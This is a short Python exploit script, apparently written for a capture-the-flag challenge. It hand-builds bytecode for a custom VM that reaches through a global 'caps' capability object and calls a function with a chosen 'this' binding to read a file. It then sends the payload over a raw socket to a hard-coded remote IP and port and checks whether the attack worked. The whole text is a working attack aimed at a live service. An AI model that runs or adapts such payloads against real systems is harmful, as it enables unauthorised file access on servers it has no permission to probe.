import socket
import struct
import time

def p8(x): return struct.pack('<B', x)
def p16(x): return struct.pack('<H', x)

print("TEST: Simple file read with proper 'this'")
print("=" * 70)

consts = [
    b"caps",
    b"test",
]

payload = b""
payload += p8(0x10)
payload += p8(len(consts))

for c in consts:
    payload += p8(0x02)
    payload += p16(len(c))
    payload += c

code = b""

# r0 = global["caps"]
code += p8(0x02) + p8(0x00) + p8(0x00)

# r1 = r0.c
code += p8(0x20) + p8(0x01) + p8(0x00) + p8(0x03)

# r2 = r1.e
code += p8(0x20) + p8(0x02) + p8(0x01) + p8(0x0a)

# r3 = "test"
code += p8(0x01) + p8(0x03) + p8(0x01)

# r4 = r2(r3) with this=r0 (F9)
code += p8(0x30) + p8(0x04) + p8(0x02) + p8(0x00) + p8(0x01) + p8(0x03)

# RET r4
code += p8(0x31) + p8(0x04)

payload += code
hex_payload = payload.hex()

print(f"Payload: {hex_payload}\n")

HOST = '35.245.96.82'
PORT = 5000

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((HOST, PORT))
    
    s.sendall(hex_payload.encode() + b'\n')
    time.sleep(1)
    
    response = s.recv(8192).decode('utf-8', errors='replace')
    print(f"Response: '{response}'")
    
    if response and response != 'ERR\n':
        print("\n✓ It works!")
    
    s.close()
except Exception as e:
    print(f"Error: {e}")
